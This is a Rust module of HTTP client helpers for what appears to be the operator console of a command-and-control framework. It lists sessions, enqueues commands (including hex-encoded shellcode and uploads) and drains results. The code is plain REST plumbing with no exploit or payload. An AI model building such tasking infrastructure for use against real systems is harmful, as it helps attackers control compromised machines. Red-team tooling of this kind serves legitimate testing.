//! Thin HTTP helpers — the ONLY layer that touches the network.
//!
//! All wire types (`SessionView`, `TaskAck`, `ResultView`) come from `nyx_rest`,
//! so the client can never drift from the server's actual response shapes.
//! Binary payloads (upload data, shellcode) are hex-encoded strings in JSON,
//! matching the server's `JsonCommand` convention.

use anyhow::{Result, anyhow};
use nyx_rest::{SessionView, TaskAck, ResultView, authed};
use reqwest::Client;

/// Build a reqwest client with sane timeouts for an operator console.
pub fn http_client() -> Client {
    Client::builder()
        .timeout(std::time::Duration::from_secs(10))
        .build()
        .expect("reqwest client build")
}

/// `GET /api/sessions` — list all active sessions.
pub async fn fetch_sessions(client: &Client, server: &str, bearer: &str) -> Result<Vec<SessionView>> {
    let url = format!("{}/api/sessions", server.trim_end_matches('/'));
    let resp = authed(client.get(&url), &Some(bearer.to_string())).send().await?;
    if !resp.status().is_success() {
        return Err(anyhow!("sessions: HTTP {} {}", resp.status(), resp.text().await.unwrap_or_default()));
    }
    Ok(resp.json().await?)
}

/// `POST /api/task` — enqueue a command onto a session.
///
/// `command` is an arbitrary JSON value matching the server's `JsonCommand`
/// enum (`#[serde(tag="type", rename_all="lowercase")]`). The frontend
/// constructs the JSON; this layer forwards it verbatim. This is what kills
/// the old 912-line dispatch.rs — one generic path instead of per-command arms.
pub async fn enqueue_task(
    client: &Client,
    server: &str,
    bearer: &str,
    session: &str,
    command: serde_json::Value,
) -> Result<TaskAck> {
    let url = format!("{}/api/task", server.trim_end_matches('/'));
    let body = serde_json::json!({ "session": session, "command": command });
    let resp = authed(client.post(&url).json(&body), &Some(bearer.to_string())).send().await?;
    if !resp.status().is_success() {
        return Err(anyhow!("task: HTTP {} {}", resp.status(), resp.text().await.unwrap_or_default()));
    }
    Ok(resp.json().await?)
}

/// `GET /api/results?session=<hex>` — drain a session's completed results.
/// The server CLEARS the queue on this call, so we drain per-session (not per-task),
/// matching the old bridge's corrected behavior.
pub async fn drain_results(
    client: &Client,
    server: &str,
    bearer: &str,
    session: &str,
) -> Result<Vec<ResultView>> {
    let url = format!(
        "{}/api/results?session={}",
        server.trim_end_matches('/'),
        session
    );
    let resp = authed(client.get(&url), &Some(bearer.to_string())).send().await?;
    if !resp.status().is_success() {
        return Err(anyhow!("results: HTTP {} {}", resp.status(), resp.text().await.unwrap_or_default()));
    }
    Ok(resp.json().await?)
}
